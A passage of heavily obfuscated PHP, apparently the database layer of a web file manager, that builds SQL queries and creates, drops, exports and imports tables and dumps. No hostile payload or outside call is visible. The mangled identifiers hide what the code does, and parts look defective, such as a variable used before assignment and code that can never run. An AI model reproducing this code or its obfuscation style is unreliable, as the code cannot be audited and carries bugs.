$ú©Ëø­É[$Õ—ÀÄ°î[364]] : $Õ—ÀÄ°î[12]) . $this->parseOrder(!empty($ú©Ëø­É[$Õ—ÀÄ°î[453]]) ? $ú©Ëø­É[$Õ—ÀÄ°î[453]] : $Õ—ÀÄ°î[12]) . $this->parseLimit(!empty($ú©Ëø­É[$Õ—ÀÄ°î[379]]) ? $ú©Ëø­É[$Õ—ÀÄ°î[379]] : $Õ—ÀÄ°î[12]) . $this->parseLock(isset($ú©Ëø­É[$Õ—ÀÄ°î[917]]) ? $ú©Ëø­É[$Õ—ÀÄ°î[917]] : !1) . $this->parseComment(!empty($ú©Ëø­É[$Õ—ÀÄ°î[441]]) ? $ú©Ëø­É[$Õ—ÀÄ°î[441]] : $Õ—ÀÄ°î[12]); return $this->execute($‹€Ó¢àœ, $this->parseBind(!empty($ú©Ëø­É[$Õ—ÀÄ°î[372]]) ? $ú©Ëø­É[$Õ—ÀÄ°î[372]] : array())); } public function delete($Ş´ê§à¶ = array()) { $Óá›ğ£ô =& $_SERVER[Ò°Ì”İ•]; $this->model = $Ş´ê§à¶[$Óá›ğ£ô[370]]; $ÁËÜä‰´ = $Óá›ğ£ô[1115] . $this->parseTable($Ş´ê§à¶[$Óá›ğ£ô[368]]) . $this->parseWhere(!empty($Ş´ê§à¶[$Óá›ğ£ô[364]]) ? $Ş´ê§à¶[$Óá›ğ£ô[364]] : $Óá›ğ£ô[12]) . $this->parseOrder(!empty($Ş´ê§à¶[$Óá›ğ£ô[453]]) ? $Ş´ê§à¶[$Óá›ğ£ô[453]] : $Óá›ğ£ô[12]) . $this->parseLimit(!empty($Ş´ê§à¶[$Óá›ğ£ô[379]]) ? $Ş´ê§à¶[$Óá›ğ£ô[379]] : $Óá›ğ£ô[12]) . $this->parseLock(isset($Ş´ê§à¶[$Óá›ğ£ô[917]]) ? $Ş´ê§à¶[$Óá›ğ£ô[917]] : !1) . $this->parseComment(!empty($Ş´ê§à¶[$Óá›ğ£ô[441]]) ? $Ş´ê§à¶[$Óá›ğ£ô[441]] : $Óá›ğ£ô[12]); return $this->execute($ÁËÜä‰´, $this->parseBind(!empty($Ş´ê§à¶[$Óá›ğ£ô[372]]) ? $Ş´ê§à¶[$Óá›ğ£ô[372]] : array())); } public function select($âõÃèÏà = array()) { $¹åÂç¸ =& $_SERVER[Ò°Ì”İ•]; $this->model = $âõÃèÏà[$¹åÂç¸[370]]; $ÇÌ‰şŒğ = $this->buildSelectSql($âõÃèÏà); $îËØÌü¶ = isset($âõÃèÏà[$¹åÂç¸[436]]) ? $âõÃèÏà[$¹åÂç¸[436]] : !1; if ($îËØÌü¶) { $ö“™©¸Õ = is_string($îËØÌü¶[$¹åÂç¸[108]]) ? $îËØÌü¶[$¹åÂç¸[108]] : $¹åÂç¸[1116] . md5($ÇÌ‰şŒğ); $ƒ”å™”× = think_cache($ö“™©¸Õ, $¹åÂç¸[12], $îËØÌü¶); if (!1 !== $ƒ”å™”×) { return $ƒ”å™”×; } } $÷ÆÌ»Î = $this->query($ÇÌ‰şŒğ, $this->parseBind(!empty($âõÃèÏà[$¹åÂç¸[372]]) ? $âõÃèÏà[$¹åÂç¸[372]] : array())); if ($îËØÌü¶ && !1 !== $÷ÆÌ»Î) { think_cache($ö“™©¸Õ, $÷ÆÌ»Î, $îËØÌü¶); } return $÷ÆÌ»Î; } public function buildSelectSql($ÖëÂø = array()) { $ãÄµÄˆ =& $_SERVER[Ò°Ì”İ•]; if (isset($ÖëÂø[$ãÄµÄˆ[440]])) { if (strpos($ÖëÂø[$ãÄµÄˆ[440]], $ãÄµÄˆ[50])) { list($ÜÂÎªí‘, $ê‹€Şá) = explode($ãÄµÄˆ[50], $ÖëÂø[$ãÄµÄˆ[440]]); } else { $ÜÂÎªí‘ = $ÖëÂø[$ãÄµÄˆ[440]]; } $ÜÂÎªí‘ = $ÜÂÎªí‘ ? $ÜÂÎªí‘ : 1; $ê‹€Şá = isset($ê‹€Şá) ? $ê‹€Şá : (is_numeric($ÖëÂø[$ãÄµÄˆ[379]]) ? $ÖëÂø[$ãÄµÄˆ[379]] : 20); $»‡ÁœüÒ = $ê‹€Şá * ((int) $ÜÂÎªí‘ - 1); $ÖëÂø[$ãÄµÄˆ[379]] = $»‡ÁœüÒ . $ãÄµÄˆ[50] . $ê‹€Şá; } if (think_config($ãÄµÄˆ[1117])) { $‘¥ØÒ¾ı = $ãÄµÄˆ[1118] . md5(serialize($ÖëÂø)); $æ›Ş™Ô = think_cache($‘¥ØÒ¾ı); if ($æ›Ş™Ô) { return $æ›Ş™Ô; } } $óï÷¯‹ì = $this->parseSql($this->selectSql, $ÖëÂø); $óï÷¯‹ì .= $this->parseLock(isset($ÖëÂø[$ãÄµÄˆ[917]]) ? $ÖëÂø[$ãÄµÄˆ[917]] : !1); if (isset($‘¥ØÒ¾ı)) { think_cache($‘¥ØÒ¾ı, $óï÷¯‹ì); } return $óï÷¯‹ì; } public function parseSql($ÛöÀ£œ¤, $ĞÑí¹·  = array()) { $¥¯ô³‰« =& $_SERVER[Ò°Ì”İ•]; $ÛöÀ£œ¤ = str_replace(array($¥¯ô³‰«[1119], $¥¯ô³‰«[1120], $¥¯ô³‰«[1121], $¥¯ô³‰«[1122], $¥¯ô³‰«[1123], $¥¯ô³‰«[1124], $¥¯ô³‰«[1125], $¥¯ô³‰«[1126], $¥¯ô³‰«[1127], $¥¯ô³‰«[1128], $¥¯ô³‰«[1129]), array($this->parseTable("{$ĞÑí¹· [$¥¯ô³‰«[368]]}"), $this->parseDistinct(isset($ĞÑí¹· [$¥¯ô³‰«[1130]]) ? $ĞÑí¹· [$¥¯ô³‰«[1130]] : !1), $this->parseField(!empty($ĞÑí¹· [$¥¯ô³‰«[362]]) ? $ĞÑí¹· [$¥¯ô³‰«[362]] : $¥¯ô³‰«[233]), $this->parseJoin(!empty($ĞÑí¹· [$¥¯ô³‰«[371]]) ? $ĞÑí¹· [$¥¯ô³‰«[371]] : $¥¯ô³‰«[12]), $this->parseWhere(!empty($ĞÑí¹· [$¥¯ô³‰«[364]]) ? $ĞÑí¹· [$¥¯ô³‰«[364]] : $¥¯ô³‰«[12]), $this->parseGroup(!empty($ĞÑí¹· [$¥¯ô³‰«[590]]) ? $ĞÑí¹· [$¥¯ô³‰«[590]] : $¥¯ô³‰«[12]), $this->parseHaving(!empty($ĞÑí¹· [$¥¯ô³‰«[1131]]) ? $ĞÑí¹· [$¥¯ô³‰«[1131]] : $¥¯ô³‰«[12]), $this->parseOrder(!empty($ĞÑí¹· [$¥¯ô³‰«[453]]) ? $ĞÑí¹· [$¥¯ô³‰«[453]] : $¥¯ô³‰«[12]), $this->parseLimit(!empty($ĞÑí¹· [$¥¯ô³‰«[379]]) ? $ĞÑí¹· [$¥¯ô³‰«[379]] : $¥¯ô³‰«[12]), $this->parseUnion(!empty($ĞÑí¹· [$¥¯ô³‰«[434]]) ? $ĞÑí¹· [$¥¯ô³‰«[434]] : $¥¯ô³‰«[12]), $this->parseComment(!empty($ĞÑí¹· [$¥¯ô³‰«[441]]) ? $ĞÑí¹· [$¥¯ô³‰«[441]] : $¥¯ô³‰«[12])), $ÛöÀ£œ¤); return $ÛöÀ£œ¤; } public function getLastSql($İ½ÅÍ’Í = '') { return $İ½ÅÍ’Í ? $this->modelSql[$İ½ÅÍ’Í] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($å™­ıˆ) { return addslashes($å™­ıˆ); } public function setModel($¯™¤¬ßÍ) { $this->model = $¯™¤¬ßÍ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($äÓ¬ùúƒ = array()) { $Öô¤ğ—Ì =& $_SERVER[Ò°Ì”İ•]; if (empty($äÓ¬ùúƒ)) { $äÓ¬ùúƒ = $GLOBALS[$Öô¤ğ—Ì[6]][$Öô¤ğ—Ì[21]]; } $this->database = $äÓ¬ùúƒ; } public function model($ûŠ®Á†¡ = '') { return new ModelBase($ûŠ®Á†¡, $_SERVER[Ò°Ì”İ•][12], $this->database); } public function db($äƒ·¡è× = false) { $ÖŠ³ê¢ =& $_SERVER[Ò°Ì”İ•]; $øåª¬ú = array_change_key_case($this->database); if ($this->dbType() == $ÖŠ³ê¢[13] || !$äƒ·¡è×) { return $this->model()->db(); } $ùÔ±©Ô = $øåª¬ú[$ÖŠ³ê¢[1045]]; $øåª¬ú[$ÖŠ³ê¢[1045]] = $ÖŠ³ê¢[12]; if ($øåª¬ú[$ÖŠ³ê¢[1040]] == $ÖŠ³ê¢[1037]) { $Ü‡“…÷÷ = $øåª¬ú[$ÖŠ³ê¢[1046]]; $øåª¬ú[$ÖŠ³ê¢[1046]] = substr($Ü‡“…÷÷, 0, strrpos($Ü‡“…÷÷, $ÖŠ³ê¢[1132])); } $this->database = $øåª¬ú; $ËŸêÀáá = $this->model()->db(); try { $ÒšŸ¶É‚ = $ËŸêÀáá->execute("\x73\x68\157\x77\40\144\x61\x74\x61\x62\x61\163\145\x73\40\x6c\x69\153\145\x20\x27{$ùÔ±©Ô}\x27"); } catch (Exception $İ¥Â ¥) { } if (!$ÒšŸ¶É‚) { $ËŸêÀáá->execute("\143\162\145\x61\164\145\x20\144\141\x74\x61\x62\141\163\x65\x20\x60{$ùÔ±©Ô}\x60"); } $øåª¬ú[$ÖŠ³ê¢[1045]] = $ùÔ±©Ô; if ($øåª¬ú[$ÖŠ³ê¢[1040]] == $ÖŠ³ê¢[1037]) { $øåª¬ú[$ÖŠ³ê¢[1046]] .= $ÖŠ³ê¢[1132] . $ùÔ±©Ô; } $this->database = $øåª¬ú; $ËŸêÀáá->execute("\x75\163\145\x20\140{$ùÔ±©Ô}\140"); return $ËŸêÀáá; } public function createTable($–ÑıÄÈ–, &$¦©´”ÛÙ) { $ÍÖˆÄ¶í =& $_SERVER[Ò°Ì”İ•]; if (!IO::exist($–ÑıÄÈ–)) { ActionCall($ÍÖˆÄ¶í[1133], !0, 0); show_json(LNG($ÍÖˆÄ¶í[1134]), !1); } $ïÊãİà = $this->model()->db(); $ûæ¹¼—Ì = sqlSplit(IO::getContent($–ÑıÄÈ–)); foreach ($ûæ¹¼—Ì as $üñ‚ÓÇá) { $¬íœè· = stripos($üñ‚ÓÇá, $ÍÖˆÄ¶í[1135]) === 0; if ($¬íœè·) { $¦©´”ÛÙ->task[$ÍÖˆÄ¶í[1136]] += 1; } $ïÊãİà->execute($üñ‚ÓÇá); if ($¬íœè·) { preg_match($ÍÖˆÄ¶í[1137], $üñ‚ÓÇá, $éÉ¾™ğá); $¦©´”ÛÙ->task[$ÍÖˆÄ¶í[1138]] = $éÉ¾™ğá[1]; $¦©´”ÛÙ->update(1); } } } public function insertTable($‹¸Ù¯Å, &$ËËŠÒ‚») { $ô¾•»‹† =& $_SERVER[Ò°Ì”İ•]; $¹™×–ğ = $this->model()->db(); $³ŞŞÊô = $¬Ş·Âë ? array($¬Ş·Âë) : $¹™×–ğ->getTables(); foreach ($‹¸Ù¯Å as $®Œ™ĞÄŞ) { $¬Ş·Âë = basename($®Œ™ĞÄŞ, $ô¾•»‹†[862]); if (!in_array($¬Ş·Âë, $³ŞŞÊô)) { continue; } $ËËŠÒ‚»->task[$ô¾•»‹†[1138]] = $¬Ş·Âë; if (get_filesize($®Œ™ĞÄŞ) == 0) { continue; } $–áÎØß = $this->sqlToDb($®Œ™ĞÄŞ, $ËËŠÒ‚»); if (!$–áÎØß) { ActionCall($ô¾•»‹†[1133], !0, 0); show_json(LNG($ô¾•»‹†[1139]) . "\133{$¬Ş·Âë}\x5d", !1); } } } public function sqlFromDb($‡ôò ¶ù, $¦İúÃ’, &$×ªÍª·, $Ö‰©ÑêÖ = '') { if ($×ªÍª·) { $×ªÍª·->task[$_SERVER[Ò°Ì”İ•][1138]] = $‡ôò ¶ù; } $Úêµûâ = $this->model($‡ôò ¶ù); $óåÇ˜€™ = 0; $¡ëîÌï± = 0; $¯šâ‚› = 10000; $³…Úã¤¾ = fopen($¦İúÃ’, $_SERVER[Ò°Ì”İ•][1140]); $öÄ”æÕÏ = $Úêµûâ->getPk(); $®¡şì‹ = $Úêµûâ->getDbFields(); $üÁÜƒ¶ = $_SERVER[Ò°Ì”İ•][12]; if ($GLOBALS[$_SERVER[Ò°Ì”İ•][861]] && in_array($‡ôò ¶ù, array($_SERVER[Ò°Ì”İ•][1141], $_SERVER[Ò°Ì”İ•][1142]))) { $üÁÜƒ¶ = $‡ôò ¶ù; } do { $ïåªş§Æ = array($öÄ”æÕÏ => array($_SERVER[Ò°Ì”İ•][1087], $¡ëîÌï±)); $ş¹øåí€ = $Úêµûâ->where($ïåªş§Æ)->field($®¡şì‹)->order($öÄ”æÕÏ . $_SERVER[Ò°Ì”İ•][1143])->limit($¯šâ‚›)->select(); $ş¹øåí€ = !empty($ş¹øåí€) ? $ş¹øåí€ : array(); if (!($îüÏ³ß’ = count($ş¹øåí€))) { break; } $°—ªº¤ş = end($ş¹øåí€); $¡ëîÌï± = $°—ªº¤ş[$öÄ”æÕÏ]; $èºü¬ğ = array(); foreach ($ş¹øåí€ as $ÉÄ¸œ‰) { if ($üÁÜƒ¶) { if ($‡ôò ¶ù == $_SERVER[Ò°Ì”İ•][1141]) { if ($ÉÄ¸œ‰[$_SERVER[Ò°Ì”İ•][33]] == $_SERVER[Ò°Ì”İ•][1144]) { $Ã˜…úà¬ = json_decode($ÉÄ¸œ‰[$_SERVER[Ò°Ì”İ•][462]], !0); if ($Ã˜…úà¬[$_SERVER[Ò°Ì”İ•][32]] == $GLOBALS[$_SERVER[Ò°Ì”İ•][861]] && $Ã˜…úà¬[$_SERVER[Ò°Ì”İ•][823]] != 1) { continue; } } } else { if ($ÉÄ¸œ‰[$_SERVER[Ò°Ì”İ•][33]] == $_SERVER[Ò°Ì”İ•][1145] && $ÉÄ¸œ‰[$_SERVER[Ò°Ì”İ•][108]] == $_SERVER[Ò°Ì”İ•][856]) { continue; } } } if ($Ö‰©ÑêÖ) { $ÉÄ¸œ‰[$_SERVER[Ò°Ì”İ•][98]] = "\x7b\x69\157\72{$Ö‰©ÑêÖ}\175" . substr($ÉÄ¸œ‰[$_SERVER[Ò°Ì”İ•][98]], strlen("\x7b\x69\157\72{$ÉÄ¸œ‰[$_SERVER[Ò°Ì”İ•][891]]}\175")); $ÉÄ¸œ‰[$_SERVER[Ò°Ì”İ•][891]] = $Ö‰©ÑêÖ; } $èºü¬ğ[] = $_SERVER[Ò°Ì”İ•][1146] . $this->sqlEncode($ÉÄ¸œ‰) . $_SERVER[Ò°Ì”İ•][1147]; } $ÃĞÕË× = "\111\x4e\x53\x45\122\124\40\111\116\124\x4f\x20\140{$‡ôò ¶ù}\140\x20\50\x60" . implode($_SERVER[Ò°Ì”İ•][1148], $®¡şì‹) . $_SERVER[Ò°Ì”İ•][1149]; fwrite($³…Úã¤¾, $ÃĞÕË× . implode($_SERVER[Ò°Ì”İ•][1150], $èºü¬ğ) . $_SERVER[Ò°Ì”İ•][85] . PHP_EOL); $óåÇ˜€™ += $îüÏ³ß’; if ($×ªÍª·) { $×ªÍª·->update($îüÏ³ß’); } } while ($¯šâ‚› == $îüÏ³ß’); fclose($³…Úã¤¾); return $óåÇ˜€™; } public function sqlToDb($µŸ‘ğÖÌ, &$è¾ÇÍ–¯) { $—Òß¸İã =& $_SERVER[Ò°Ì”İ•]; $¼Ç‘Å·† = $this->model()->db(); $øø‡¾æı = @fopen($µŸ‘ğÖÌ, $—Òß¸İã[1151]); if (!$øø‡¾æı) { return !1; } $ŒËÓàâ = 0; $îñôÎş¸ = $—Òß¸İã[12]; $ñÁï› = array(); $ÖÑŸÅ×› = $this->dbType(); $Õ­€Ëõ = $ÖÑŸÅ×› == $—Òß¸İã[13] ? 500 : 2000; $„İİ¢¤ = basename($µŸ‘ğÖÌ, $—Òß¸İã[862]); $¬Î¥Ãä = 0; $¦¯ŸÏÌ± = 4194304; while (!feof($øø‡¾æı)) { $üÒËú = trim(fgets($øø‡¾æı)); if (!$üÒËú) { continue; } $ìÑ™ºÙ³ = $this->sqlDecode($üÒËú, $ÖÑŸÅ×›, $„İİ¢¤); if (stripos($ìÑ™ºÙ³, $—Òß¸İã[442]) === 0) { if (!$îñôÎş¸) { $îñôÎş¸ = $ìÑ™ºÙ³ . $—Òß¸İã[53]; } continue; } if ($è¾ÇÍ–¯) { $è¾ÇÍ–¯->task[$—Òß¸İã[1136]] += 1; } $ŒËÓàâ++; $ñÁï›[] = rtrim(rtrim(trim($ìÑ™ºÙ³), $—Òß¸İã[50]), $—Òß¸İã[85]); $àˆ£¼®å = null; $î”‘Ñ‹© = strlen($ìÑ™ºÙ³); $¬Î¥Ãä += $î”‘Ñ‹©; $Æë·Åä¾ = strlen($îñôÎş¸) + $¬Î¥Ãä + (count($ñÁï›) - 1); if ($Æë·Åä¾ >= $¦¯ŸÏÌ±) { $àˆ£¼®å = array_pop($ñÁï›); if ($ŒËÓàâ > 1) { $ŒËÓàâ--; } } if ($ŒËÓàâ >= $Õ­€Ëõ || $àˆ£¼®å) { $ìÑ™ºÙ³ = $îñôÎş¸ . implode($—Òß¸İã[50], $ñÁï›); if (!$¼Ç‘Å·†->execute($ìÑ™ºÙ³)) { return !1; } if ($è¾ÇÍ–¯) { $è¾ÇÍ–¯->update($ŒËÓàâ); } $ñÁï› = array(); $ŒËÓàâ = 0; $¬Î¥Ãä = 0; if ($àˆ£¼®å) { $ñÁï› = array($àˆ£¼®å); $ŒËÓàâ = 1; $¬Î¥Ãä = $î”‘Ñ‹©; } } } fclose($øø‡¾æı); if (!empty($ñÁï›)) { $ìÑ™ºÙ³ = $îñôÎş¸ . implode($—Òß¸İã[50], $ñÁï›); if (!$¼Ç‘Å·†->execute($ìÑ™ºÙ³)) { return !1; } if ($è¾ÇÍ–¯) { $è¾ÇÍ–¯->update($ŒËÓàâ); } } return !0; } public function dropTable($¶‰¹†Ìğ = null) { $ÃÒ·ŸŞÙ = $this->model()->db(); $ô§¡¼ƒº = $¶‰¹†Ìğ ? array($¶‰¹†Ìğ) : $ÃÒ·ŸŞÙ->getTables(); if (!$ô§¡¼ƒº) { return; } foreach ($ô§¡¼ƒº as $¶‰¹†Ìğ) { if ($¶‰¹†Ìğ) { $¶‰¹†Ìğ = strtolower($¶‰¹†Ìğ); } else { continue; } $ÃÒ·ŸŞÙ->execute("\x64\162\157\x70\40\164\x61\142\x6c\145\x20\151\146\x20\145\x78\151\163\x74\163\x20\x60{$¶‰¹†Ìğ}\x60"); } } private function sqlEncode($ïïã¦¢Å) { $ÑÂ«ëù¨ =& $_SERVER[Ò°Ì”İ•]; $ü°¶†©ó = array(); foreach ($ïïã¦¢Å as $ø‚Ôèí) { if (is_array($ø‚Ôèí)) { $ø‚Ôèí = json_encode_force($ø‚Ôèí); } $ø‚Ôèí = addslashes($ø‚Ôèí); $ø‚Ôèí = str_replace(array($ÑÂ«ëù¨[1152], $ÑÂ«ëù¨[59], $ÑÂ«ëù¨[429]), array($ÑÂ«ëù¨[1153], $ÑÂ«ëù¨[1154], $ÑÂ«ëù¨[1155]), $ø‚Ôèí); $ü°¶†©ó[] = $ø‚Ôèí; } return $ÑÂ«ëù¨[68] . implode($ÑÂ«ëù¨[1156], $ü°¶†©ó) . $ÑÂ«ëù¨[68]; } private function sqlDecode($¤Éíµõª, $èé®»©Ş, $ÚÂ¢Àş = '') { $ğäõˆ£Ğ =& $_SERVER[Ò°Ì”İ•]; $¤Éíµõª = str_replace(array($ğäõˆ£Ğ[1153], $ğäõˆ£Ğ[1154], $ğäõˆ£Ğ[1155]), array($ğäõˆ£Ğ[1152], $ğäõˆ£Ğ[59], $ğäõˆ£Ğ[429]), $¤Éíµõª); if ($èé®»©Ş == $ğäõˆ£Ğ[13]) { $¤Éíµõª = str_ireplace($ğäõˆ£Ğ[1157], $ğäõˆ£Ğ[69], $¤Éíµõª); $¤Éíµõª = stripslashes($¤Éíµõª); } return preg_replace($ğäõˆ£Ğ[1158], $ğäõˆ£Ğ[12], $¤Éíµõª); if ($èé®»©Ş == $ğäõˆ£Ğ[13]) { return $ÚÂ¢Àş != $ğäõˆ£Ğ[855] ? stripslashes($¤Éíµõª) : $¤Éíµõª; } if ($ÚÂ¢Àş == $ğäõˆ£Ğ[855]) { $¤Éíµõª = str_replace($ğäõˆ£Ğ[1159], $ğäõˆ£Ğ[132], stripslashes($¤Éíµõª)); } return $¤Éíµõª; } public function getSqlFile($íÒ€ó = '') { $à©‡„óş =& $_SERVER[Ò°Ì”İ•]; $Å—æ¥úİ = $this->dbType(!0); $Áò˜©– = CONTROLLER_DIR . "\x69\x6e\x73\164\141\154\154\x2f\144\141\164\141\57{$Å—æ¥úİ}\56\163\161\x6c"; $âü–Ã®… = file_get_contents($Áò˜©–); $¬…àíš = $à©‡„óş[1160] . ($Å—æ¥úİ == $à©‡„óş[878] ? $à©‡„óş[1161] : $à©‡„óş[1162]) . $à©‡„óş[1163]; preg_match_all($¬…àíš, $âü–Ã®…, $ó‡üºà¦); $ÚŞÏ­Êë = $ó‡üºà¦[1]; $ŞÍùéÚ = $this->model()->db(); $°é• ×¢ = $ŞÍùéÚ->getTables(); $Ú‹…¼Òå = TEMP_FILES . $à©‡„óş[1164] . date($à©‡„óş[272]) . $à©‡„óş[8]; del_dir($Ú‹…¼Òå); mk_dir($Ú‹…¼Òå); $Í®è­Ö‚ = $Ú‹…¼Òå . $à©‡„óş[1165]; $ƒØ¨Âš = $Ú‹…¼Òå . $à©‡„óş[1166]; $‰’¸êÓ… = $Å—æ¥úİ == $à©‡„óş[13] ? $à©‡„óş[878] : $à©‡„óş[13]; IO::copy(CONTROLLER_DIR . "\x69\156\x73\x74\141\x6c\154\x2f\144\141\164\x61\x2f{$‰’¸êÓ…}\56\163\x71\154", $Ú‹…¼Òå); @touch($Ú‹…¼Òå . $Å—æ¥úİ . $à©‡„óş[862]); $Ä·ïôğ = fopen($Í®è­Ö‚, $à©‡„óş[1140]); $ø´Æ‡ó­ = fopen($ƒØ¨Âš, $à©‡„óş[1140]); if ($Å—æ¥úİ == $à©‡„óş[13]) { $°é• ×¢ = array_diff($°é• ×¢, array($à©‡„óş[853], $à©‡„óş[854])); $œ·â¸¹¹ = array($à©‡„óş[1167], $à©‡„óş[1168], $à©‡„óş[1169]); fwrite($ø´Æ‡ó­, implode(PHP_EOL, $œ·â¸¹¹) . PHP_EOL . PHP_EOL); foreach ($°é• ×¢ as $üÎ€Úø›) { $ˆ­“´ = $this->sqlFromSqlite($üÎ€Úø›); if (!$ˆ­“´[$à©‡„óş[13]]) { continue; } fwrite($ø´Æ‡ó­, $ˆ­“´[$à©‡„óş[13]] . PHP_EOL . PHP_EOL); if (!in_array($üÎ€Úø›, $ÚŞÏ­Êë)) { fwrite($Ä·ïôğ, $ˆ­“´[$à©‡„óş[878]] . PHP_EOL . PHP_EOL); } } } else { foreach ($°é• ×¢ as $üÎ€Úø›) { $ˆ­“´ = $this->sqlFromMysql($üÎ€Úø›); if (!$ˆ­“´[$à©‡„óş[878]]) { continue; } fwrite($Ä·ïôğ, $ˆ­“´[$à©‡„óş[878]] . PHP_EOL . PHP_EOL); if (!in_array($üÎ€Úø›, $ÚŞÏ­Êë)) { fwrite($ø´Æ‡ó­, $ˆ­“´[$à©‡„óş[13]] . PHP_EOL . PHP_EOL); } } } fclose($Ä·ïôğ); fclose($ø´Æ‡ó­); $âü–Ã®… = array($à©‡„óş[878] => $Í®è­Ö‚, $à©‡„óş[13] => $ƒØ¨Âš); return $íÒ€ó ? $âü–Ã®…[$íÒ€ó] : $âü–Ã®…; } public function dbType($ù°Õ™®æ = false) { $ÙƒÂ¤‰€ =& $_SERVER[Ò°Ì”İ•]; $”¾Ñ‹›î = $ù°Õ™®æ ? $GLOBALS[$ÙƒÂ¤‰€[6]][$ÙƒÂ¤‰€[21]] : $this->database; $”¾Ñ‹›î = array_change_key_case($”¾Ñ‹›î); $ÕÒı‰ƒ = $”¾Ñ‹›î[$ÙƒÂ¤‰€[1040]]; if ($ÕÒı‰ƒ == $ÙƒÂ¤‰€[1037]) { $àÉøì½ = explode($ÙƒÂ¤‰€[4], $”¾Ñ‹›î[$ÙƒÂ¤‰€[1046]]); $ÕÒı‰ƒ = $àÉøì½[0]; } $¡½å¾ºİ = array($ÙƒÂ¤‰€[1170] => $ÙƒÂ¤‰€[13], $ÙƒÂ¤‰€[985] => $ÙƒÂ¤‰€[878]); if (isset($¡½å¾ºİ[$ÕÒı‰ƒ])) { $ÕÒı‰ƒ = $¡½å¾ºİ[$ÕÒı‰ƒ]; } return $ÕÒı‰ƒ; } public function sqlFromMysql($£¥¯ÁÌ, $Ø¬×ò®‚ = '') { $éÊÑ¿ñÛ =& $_SERVER[Ò°Ì”İ•]; $²ß÷ÀæÍ = $this->model()->db(); $ãÂ ß©  = $²ß÷ÀæÍ->query($éÊÑ¿ñÛ[1171] . $£¥¯ÁÌ . $éÊÑ¿ñÛ[473]); if (!$ãÂ ß©  || !$ãÂ ß© [0]) { return !1; } $ÁÜ®ÅÒ¤ = _get($ãÂ ß© [0], $éÊÑ¿ñÛ[1172], $éÊÑ¿ñÛ[12]); if (!$ÁÜ®ÅÒ¤) { return !1; } $ãêáøàŸ = "\x44\x52\117\x50\40\124\101\102\x4c\x45\x20\x49\x46\x20\x45\130\111\123\124\123\x20\140{$£¥¯ÁÌ}\x60\x3b" . PHP_EOL . $ÁÜ®ÅÒ¤ . $éÊÑ¿ñÛ[85]; if ($Ø¬×ò®‚ && $Ø¬×ò®‚ == $éÊÑ¿ñÛ[878]) { return $ãêáøàŸ; } $¼Æäƒ™ = array_change_key_case($GLOBALS[$éÊÑ¿ñÛ[6]][$éÊÑ¿ñÛ[21]]); $Õš™ÅµÃ = $¼Æäƒ™[$éÊÑ¿ñÛ[1045]]; $úïüÜİ« = $éÊÑ¿ñÛ[1173] . $Õš™ÅµÃ . $éÊÑ¿ñÛ[1174] . $£¥¯ÁÌ . $éÊÑ¿ñÛ[68]; $ô»¶•«Ø = $éÊÑ¿ñÛ[1175] . $£¥¯ÁÌ . $éÊÑ¿ñÛ[973]; $›à÷ÈŞş = $²ß÷ÀæÍ->query($úïüÜİ«); if (empty($›à÷ÈŞş)) { $œòğ¢¡ù = array($éÊÑ¿ñÛ[878] => $éÊÑ¿ñÛ[12], $éÊÑ¿ñÛ[13] => $éÊÑ¿ñÛ[12]); return $Ø¬×ò®‚ ? $œòğ¢¡ù[$Ø¬×ò®‚] : $œòğ¢¡ù; } $Øäú‰î¯ = $²ß÷ÀæÍ->query($ô»¶•«Ø); $ÁĞ´•ßÉ = $éÊÑ¿ñÛ[12]; $ÁöÍ«‘Ê = array(); foreach ($Øäú‰î¯ as $Ğ™èë) { if (!$ÁĞ´•ßÉ && $Ğ™èë[$éÊÑ¿ñÛ[1176]] == $éÊÑ¿ñÛ[1177]) { $ÁĞ´•ßÉ = $Ğ™èë[$éÊÑ¿ñÛ[1178]]; } if (isset($ÁöÍ«‘Ê[$Ğ™èë[$éÊÑ¿ñÛ[1176]]])) { $ÁöÍ«‘Ê[$Ğ™èë[$éÊÑ¿ñÛ[1176]]][$éÊÑ¿ñÛ[1179]][] = $Ğ™èë[$éÊÑ¿ñÛ[1178]]; continue; } $ÁöÍ«‘Ê[$Ğ™èë[$éÊÑ¿ñÛ[1176]]] = array($éÊÑ¿ñÛ[1180] => $Ğ™èë[$éÊÑ¿ñÛ[1176]], $éÊÑ¿ñÛ[1179] => array($Ğ™èë[$éÊÑ¿ñÛ[1178]]), $éÊÑ¿ñÛ[1181] => $Ğ™èë[$éÊÑ¿ñÛ[1182]] == $éÊÑ¿ñÛ[102] ? 0 : 1); } $Ï¥û€È˜ = array(); foreach ($ÁöÍ«‘Ê as $Ğ™èë) { $ÆîÆÊ = $Ğ™èë[$éÊÑ¿ñÛ[1180]] == $éÊÑ¿ñÛ[1177]; $—Ô½ı«€ = array($éÊÑ¿ñÛ[1183], $Ğ™èë[$éÊÑ¿ñÛ[1181]] == $éÊÑ¿ñÛ[102] && !$ÆîÆÊ ? $éÊÑ¿ñÛ[1184] : $éÊÑ¿ñÛ[12], $éÊÑ¿ñÛ[1185], $éÊÑ¿ñÛ[1186] . $£¥¯ÁÌ . $éÊÑ¿ñÛ[11] . ($ÆîÆÊ ? $éÊÑ¿ñÛ[1187] : $Ğ™èë[$éÊÑ¿ñÛ[1180]]) . $éÊÑ¿ñÛ[132], $éÊÑ¿ñÛ[1188], $éÊÑ¿ñÛ[132] . $£¥¯ÁÌ . $éÊÑ¿ñÛ[132], $éÊÑ¿ñÛ[1189] . implode($éÊÑ¿ñÛ[1190], $Ğ™èë[$éÊÑ¿ñÛ[1179]]) . $éÊÑ¿ñÛ[1191]); $Ï¥û€È˜[] = implode($éÊÑ¿ñÛ[53], $—Ô½ı«€) . $éÊÑ¿ñÛ[85]; } $µÃÔ†şò = array(); $Ìé±ø¸ = array($éÊÑ¿ñÛ[1192] => $éÊÑ¿ñÛ[1193], $éÊÑ¿ñÛ[1193] => $éÊÑ¿ñÛ[1193], $éÊÑ¿ñÛ[375] => $éÊÑ¿ñÛ[402], $éÊÑ¿ñÛ[374] => $éÊÑ¿ñÛ[402]); foreach ($›à÷ÈŞş as $Ğ™èë) { $—Ô½ı«€ = array($éÊÑ¿ñÛ[132] . $Ğ™èë[$éÊÑ¿ñÛ[1194]] . $éÊÑ¿ñÛ[132], isset($Ìé±ø¸[$Ğ™èë[$éÊÑ¿ñÛ[1195]]]) ? $Ìé±ø¸[$Ğ™èë[$éÊÑ¿ñÛ[1195]]] : $Ğ™èë[$éÊÑ¿ñÛ[1196]], 